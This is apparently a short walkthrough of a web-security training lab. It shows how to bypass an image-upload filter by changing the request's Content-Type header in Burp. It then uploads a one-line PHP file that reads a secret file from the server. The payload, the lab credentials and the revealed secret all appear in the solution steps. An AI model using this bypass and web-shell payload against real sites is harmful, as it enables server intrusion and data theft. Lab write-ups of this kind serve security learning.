
# File_Upload 

## Web shell upload via Content-Type restriction bypass

### Problem

- This lab contains a vulnerable image upload function. It attempts to prevent users from uploading unexpected file types, but relies on checking user-controllable input to verify this.

- To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.

- You can log in to your own account using the following credentials: `wiener:peter`.

### Solution

- Login with given Credential.Connect to burp.

- Upload the profile picture name test.php contain the malicious code `<?php echo file_get_contents('/home/carlos/secret'); ?>`.But it says only `Image/png or image.jpg` valid.

- See the Http history `myaccounts/avatar` & sent it to repeter.Change the Content-type `application/x-php` to `image/png`.Sent the request and refresh the web page you see the file is uploaded.

- You see the Secret key in `files/avatar/test.php` name `w2ORl0mrcpCgsAJJBXqaWtstaRVOVW9Q`.

- Lab solved!!!
